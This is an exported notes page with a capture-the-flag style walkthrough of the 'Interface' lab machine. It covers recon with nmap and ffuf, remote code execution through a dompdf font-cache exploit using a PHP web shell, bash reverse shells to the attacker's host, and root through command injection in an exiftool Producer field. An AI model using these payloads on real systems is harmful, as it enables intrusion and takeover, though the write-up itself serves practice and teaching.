@@ -1,0 +1,183 @@
+<!doctype html><html><head><title>Interface</title><base href="./"><meta id="root-path" root-path="./"><link rel="icon" sizes="96x96" href="https://publish-01.obsidian.md/access/f786db9fac45774fa4f0d8112e232d67/favicon-96x96.png"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=yes,minimum-scale=1,maximum-scale=5"><meta charset="UTF-8"><link rel="stylesheet" href="lib/styles/obsidian-styles.css"><link rel="stylesheet" href="lib/styles/theme.css"><link rel="stylesheet" href="lib/styles/plugin-styles.css"><link rel="stylesheet" href="lib/styles/snippets.css"><link rel="stylesheet" href="lib/styles/generated-styles.css"><style></style><script type="module" src="lib/scripts/graph_view.js"></script><script src="lib/scripts/graph_wasm.js"></script><script src="lib/scripts/tinycolor.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.2.4/pixi.min.js" integrity="sha512-Ch/O6kL8BqUwAfCF7Ie5SX1Hin+BJgYH4pNjRqXdTEqMsis1TUYg+j6nnI9uduPjGaj7DN4UKCZgpvoExt6dkw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script><script src="lib/scripts/webpage.js"></script><script src="lib/scripts/generated.js"></script></head><body class="theme-dark mod-linux show-inline-title loading"><div class="webpage-container"><div class="sidebar-left sidebar"><div class="sidebar-container"><div class="sidebar-sizer"><div class="sidebar-content-positioner"><div class="sidebar-content"><div><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" type="checkbox" id="theme_toggle"><div class="toggle-background"></div></label></div><div class="tree-container file-tree mod-nav-indicator" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Interface</span><button class="clickable-icon collapse-tree-button is-collapsed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area"><div class="tree-item mod-tree-file" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="interface.html"><span class="tree-item-title">Interface</span></a></div><div class="tree-item-children"></div></div></div></div></div></div></div></div><div class="sidebar-gutter"><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div></div><div class="document-container show"><div class="markdown-preview-view markdown-rendered node-insert-event is-readable-line-width allow-fold-headings show-indentation-guide allow-fold-lists show-properties" tabindex="-1" style="tab-size:4"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section" style="min-height:11455px"><div class="markdown-preview-pusher" style="width:1px;height:.1px;margin-bottom:0"></div><div class="mod-header"></div><div class="heading-wrapper"><h1 data-heading="Nmap" class="heading" id="Nmap"><div class="heading-before"></div>Nmap<div class="heading-after">...</div></h1><div class="heading-children"><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-29 09:53 IST
+Nmap scan report for 10.10.11.200
+Host is up (0.087s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 4.89 seconds
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-29 09:53 IST
+Nmap scan report for 10.10.11.200
+Host is up (0.086s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 72:89:a0:95:7e:ce:ae:a8:59:6b:2d:2d:bc:90:b5:5a (RSA)
+|   256 01:84:8c:66:d3:4e:c4:b1:61:1f:2d:4d:38:9c:42:c3 (ECDSA)
+|_  256 cc:62:90:55:60:a6:58:62:9e:6b:80:10:5c:79:9b:55 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-title: Site Maintenance
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.25 seconds
+</code><button class="copy-code-button">Copy</button></pre></div><div><p>Fuzzing directories on http did not lead me anywhere,</p></div><div><p>I requested the / directory in burp.<br><span alt="Pasted image 20240129102242.png" src="pasted-image-20240129102242.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129102242.png" src="pasted-image-20240129102242.png"></span></p></div><div><p>Found a subdoman<br><code>prd.m.rendering-api.interface.htb</code><br>Also it is using next-js at backend.<br>I ll add it to my /etc/hosts file.<br><span alt="Pasted image 20240129102325.png" src="pasted-image-20240129102325.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129102325.png" src="pasted-image-20240129102325.png"></span></p></div><div><p><span alt="Pasted image 20240129102758.png" src="pasted-image-20240129102758.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129102758.png" src="pasted-image-20240129102758.png"></span></p></div><div><p>I ll change the content type to json as it is using next js.</p></div><div><p>Still file not found<br><span alt="Pasted image 20240129102959.png" src="pasted-image-20240129102959.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129102959.png" src="pasted-image-20240129102959.png"></span></p></div><div><p>I started to fuzz endpoints.</p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded">➜  wordlists ffuf -u <span class="token string">"http://prd.m.rendering-api.interface.htb/FUZZ"</span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -mc all --fs <span class="token number">0</span>
+
+        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
+       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
+       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
+        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
+         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
+          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           <span class="token builtin class-name">:</span> GET
+ :: URL              <span class="token builtin class-name">:</span> http://prd.m.rendering-api.interface.htb/FUZZ
+ :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
+ :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
+ :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
+ :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
+ :: Threads          <span class="token builtin class-name">:</span> <span class="token number">40</span>
+ :: Matcher          <span class="token builtin class-name">:</span> Response status: all
+ :: Filter           <span class="token builtin class-name">:</span> Response size: <span class="token number">0</span>
+________________________________________________
+
+<span class="token punctuation">[</span>Status: <span class="token number">404</span>, Size: <span class="token number">50</span>, Words: <span class="token number">3</span>, Lines: <span class="token number">1</span>, Duration: 87ms<span class="token punctuation">]</span>
+    * FUZZ: api
+</code><button class="copy-code-button">Copy</button></pre></div><div><p>I found /api.</p></div><div><p>I did not find anything inside /api till i used a POST method to fuzz</p></div><div><p>Found html2pdf endpoint-&gt;</p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">➜  wordlists ffuf -u "http://prd.m.rendering-api.interface.htb/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc all --fs 50 -d 'a=a' 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://prd.m.rendering-api.interface.htb/api/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+ :: Data             : a=a
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Response size: 50
+________________________________________________
+
+[Status: 422, Size: 36, Words: 2, Lines: 1, Duration: 87ms]
+    * FUZZ: html2pdf
+</code><button class="copy-code-button">Copy</button></pre></div><div><p><span alt="Pasted image 20240129104510.png" src="pasted-image-20240129104510.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129104510.png" src="pasted-image-20240129104510.png"></span></p></div><div><p><span alt="Pasted image 20240129104619.png" src="pasted-image-20240129104619.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129104619.png" src="pasted-image-20240129104619.png"></span></p></div><div><p>I ll change the content type to json and fuzz parameter<br><span alt="Pasted image 20240129105008.png" src="pasted-image-20240129105008.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129105008.png" src="pasted-image-20240129105008.png"></span></p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">➜  Interface ffuf -request requests -request-proto http -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -mc all --fs 36
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://prd.m.rendering-api.interface.htb/api/html2pdf
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+ :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+ :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+ :: Header           : Accept-Language: en-US,en;q=0.5
+ :: Header           : Accept-Encoding: gzip, deflate
+ :: Header           : Upgrade-Insecure-Requests: 1
+ :: Header           : Host: prd.m.rendering-api.interface.htb
+ :: Header           : DNT: 1
+ :: Header           : Connection: close
+ :: Header           : Content-Type: application/json
+ :: Data             : { "FUZZ":"&lt;p&gt;hasdf&lt;/p&gt;"
+}
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Response size: 36
+________________________________________________
+
+[Status: 200, Size: 1132, Words: 116, Lines: 77, Duration: 229ms]
+    * FUZZ: html
+</code><button class="copy-code-button">Copy</button></pre></div><div><p><span alt="Pasted image 20240129105813.png" src="pasted-image-20240129105813.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129105813.png" src="pasted-image-20240129105813.png"></span></p></div><div><p>I ll copy the pdf to my system<br><span alt="Pasted image 20240129105835.png" src="pasted-image-20240129105835.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129105835.png" src="pasted-image-20240129105835.png"></span></p></div><div><p>Using exiftool against the pdf file.</p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded">➜  pdf exiftool hello.pdf
+ExifTool Version Number         <span class="token builtin class-name">:</span> <span class="token number">12.65</span>
+File Name                       <span class="token builtin class-name">:</span> hello.pdf
+Directory                       <span class="token builtin class-name">:</span> <span class="token builtin class-name">.</span>
+File Size                       <span class="token builtin class-name">:</span> <span class="token number">1131</span> bytes
+File Modification Date/Time     <span class="token builtin class-name">:</span> <span class="token number">2024</span>:01:29 <span class="token number">10</span>:57:46+05:30
+File Access Date/Time           <span class="token builtin class-name">:</span> <span class="token number">2024</span>:01:29 <span class="token number">10</span>:57:48+05:30
+File Inode Change Date/Time     <span class="token builtin class-name">:</span> <span class="token number">2024</span>:01:29 <span class="token number">10</span>:57:46+05:30
+File Permissions                <span class="token builtin class-name">:</span> -rw-r--r--
+File Type                       <span class="token builtin class-name">:</span> PDF
+File Type Extension             <span class="token builtin class-name">:</span> pdf
+MIME Type                       <span class="token builtin class-name">:</span> application/pdf
+PDF Version                     <span class="token builtin class-name">:</span> <span class="token number">1.7</span>
+Linearized                      <span class="token builtin class-name">:</span> No
+Page Count                      <span class="token builtin class-name">:</span> <span class="token number">1</span>
+Producer                        <span class="token builtin class-name">:</span> dompdf <span class="token number">1.2</span>.0 + CPDF
+Create Date                     <span class="token builtin class-name">:</span> <span class="token number">2024</span>:01:29 05:26:24+00:00
+Modify Date                     <span class="token builtin class-name">:</span> <span class="token number">2024</span>:01:29 05:26:24+00:00
+➜  pdf 
+</code><button class="copy-code-button">Copy</button></pre></div><div><p><span alt="Pasted image 20240129110001.png" src="pasted-image-20240129110001.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129110001.png" src="pasted-image-20240129110001.png"></span></p></div><div><p><span alt="Pasted image 20240129132322.png" src="pasted-image-20240129132322.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129132322.png" src="pasted-image-20240129132322.png"></span></p></div><div><p><a rel="noopener" class="external-link" href="https://github.com/positive-security/dompdf-rce" target="_blank">https://github.com/positive-security/dompdf-rce</a></p></div><div><p>I ll clone the repo and make some changes.</p></div><div><p>Exploit.css</p></div><div><pre class="language-css" tabindex="0"><code class="language-css is-loaded"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>
+    <span class="token property">font-family</span><span class="token punctuation">:</span><span class="token string">'exploitfont'</span><span class="token punctuation">;</span>
+    <span class="token property">src</span><span class="token punctuation">:</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">'http://10.10.14.10/exploit_font.php'</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span>
+    <span class="token property">font-weight</span><span class="token punctuation">:</span><span class="token string">'normal'</span><span class="token punctuation">;</span>
+    <span class="token property">font-style</span><span class="token punctuation">:</span><span class="token string">'normal'</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+</code><button class="copy-code-button">Copy</button></pre></div><div><p>Added this in exploit_font.php<br><code>&lt;?php system($_REQUEST['cmd']); ?&gt;</code></p></div><div><p>I ll start a web server at port 80, and request for the exploit.css which will request for exploit_font.php which will eventually perform a remote code execution.<br><span alt="Pasted image 20240129132600.png" src="pasted-image-20240129132600.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129132600.png" src="pasted-image-20240129132600.png"></span></p></div><div><pre class="language-sh" tabindex="0"><code class="language-sh is-loaded">➜  exploit git:(main) ✗ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.200 - - [29/Jan/2024 13:18:38] "GET /exploit.css HTTP/1.0" 200 -
+10.10.11.200 - - [29/Jan/2024 13:18:38] "GET /exploit_font.php HTTP/1.0" 200 -
+</code><button class="copy-code-button">Copy</button></pre></div><div><p><code>/vendor/dompdf/dompdf/lib/fonts/[family]_[style]_[m5d(url)].php</code><br><code>/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_aafcdbbbcd76ebb26e18f81199c90866.php</code></p></div><div><p><span alt="Pasted image 20240129132727.png" src="pasted-image-20240129132727.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129132727.png" src="pasted-image-20240129132727.png"></span></p></div><div><p>I ll get a reverse shell.</p></div><div><p>index.html</p></div><div><pre><code>➜  exploit git:(main) ✗ cat index.html 
+bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.10/9001 0&gt;&amp;1"
+</code><button class="copy-code-button">Copy</button></pre></div><div><p><span alt="Pasted image 20240129132809.png" src="pasted-image-20240129132809.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129132809.png" src="pasted-image-20240129132809.png"></span></p></div><div><p>Got shell<br><span alt="Pasted image 20240129132822.png" src="pasted-image-20240129132822.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129132822.png" src="pasted-image-20240129132822.png"></span></p></div><div><p>I did not see any credentials so i launched pspy on target.<br><span alt="Pasted image 20240129133421.png" src="pasted-image-20240129133421.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129133421.png" src="pasted-image-20240129133421.png"></span></p></div><div><p>I ll take a look at cleancache.sh</p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded">www-data@interface:/opt$ <span class="token function">cat</span> /usr/local/sbin/cleancache.sh 
+<span class="token comment">#! /bin/bash</span>
+<span class="token assign-left variable">cache_directory</span><span class="token operator">=</span><span class="token string">"/tmp"</span>
+<span class="token keyword">for</span> <span class="token for-or-select variable">cfile</span> <span class="token keyword">in</span> <span class="token string">"<span class="token variable">$cache_directory</span>"</span>/*<span class="token punctuation">;</span> <span class="token keyword">do</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> -f <span class="token string">"<span class="token variable">$cfile</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+
+        <span class="token assign-left variable">meta_producer</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>/usr/bin/exiftool -s -s -s -Producer <span class="token string">"<span class="token variable">$cfile</span>"</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">" "</span> -f1<span class="token variable">)</span></span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$meta_producer</span>"</span> -eq <span class="token string">"dompdf"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+            <span class="token builtin class-name">echo</span> <span class="token string">"Removing <span class="token variable">$cfile</span>"</span>
+            <span class="token function">rm</span> <span class="token string">"<span class="token variable">$cfile</span>"</span>
+        <span class="token keyword">fi</span>
+
+    <span class="token keyword">fi</span>
+
+<span class="token keyword">done</span>
+</code><button class="copy-code-button">Copy</button></pre></div><div><p>Always look at where we can inject in the script, its in the <code>meta_producer</code> The if statement is doing some arithmetic equation, it is what is vulnerable to code injection.<br><span alt="Pasted image 20240129174941.png" src="pasted-image-20240129174941.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129174941.png" src="pasted-image-20240129174941.png"></span></p></div><div><p><span alt="Pasted image 20240129175301.png" src="pasted-image-20240129175301.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129175301.png" src="pasted-image-20240129175301.png"></span></p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded">www-data@interface:/dev/shm$ <span class="token function">cat</span> rev.sh 
+<span class="token comment">#!/bin/bash</span>
+<span class="token function">bash</span> -i <span class="token operator">&gt;&amp;</span> /dev/tcp/10.10.14.10/9001 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
+www-data@interface:/dev/shm$ <span class="token function">chmod</span> +x rev.sh 
+www-data@interface:/dev/shm$ <span class="token function">touch</span> hello
+ww-data@interface:/dev/shm$ exiftool -Producer<span class="token operator">=</span><span class="token string">'arr[$(/dev/shm/rev.sh)]'</span> hello
+<span class="token number">1</span> image files updated
+www-data@interface:/dev/shm$ exiftool hello
+ExifTool Version Number         <span class="token builtin class-name">:</span> <span class="token number">12.55</span>
+File Name                       <span class="token builtin class-name">:</span> hello
+Directory                       <span class="token builtin class-name">:</span> <span class="token builtin class-name">.</span>
+File Size                       <span class="token builtin class-name">:</span> <span class="token number">2.9</span> kB
+File Modification Date/Time     <span class="token builtin class-name">:</span> <span class="token number">2024</span>:01:29 <span class="token number">12</span>:23:38+00:00
+File Access Date/Time           <span class="token builtin class-name">:</span> <span class="token number">2024</span>:01:29 <span class="token number">12</span>:23:38+00:00
+File Inode Change Date/Time     <span class="token builtin class-name">:</span> <span class="token number">2024</span>:01:29 <span class="token number">12</span>:23:38+00:00
+File Permissions                <span class="token builtin class-name">:</span> -rw-r--r--
+File Type                       <span class="token builtin class-name">:</span> EXV
+File Type Extension             <span class="token builtin class-name">:</span> exv
+MIME Type                       <span class="token builtin class-name">:</span> image/x-exv
+XMP Toolkit                     <span class="token builtin class-name">:</span> Image::ExifTool <span class="token number">12.55</span>
+Producer                        <span class="token builtin class-name">:</span> arr<span class="token punctuation">[</span><span class="token variable"><span class="token variable">$(</span>/dev/shm/rev.sh<span class="token variable">)</span></span><span class="token punctuation">]</span>
+</code><button class="copy-code-button">Copy</button></pre></div><div><p>Now we have injection our payload in Producer, I ll copy the hello file to /tmp, as /tmp is the <code>cache_directory</code></p></div><div><p><code>cp hello /tmp</code></p></div><div><p>In a minute or two I got a connection on port 9001<br><span alt="Pasted image 20240129181225.png" src="pasted-image-20240129181225.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240129181225.png" src="pasted-image-20240129181225.png"></span></p></div><div class="mod-footer"></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-gutter"><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-container"><div class="sidebar-sizer"><div class="sidebar-content-positioner"><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder"><div class="graph-view-container"><div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div><canvas id="graph-canvas" width="512px" height="512px"></canvas></div></div></div><div class="tree-container outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area"><div class="tree-item" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="#Nmap"><span class="tree-item-title"><p>Nmap</p></span></a></div><div class="tree-item-children"></div></div></div></div></div></div></div></div></div></div></body></html>
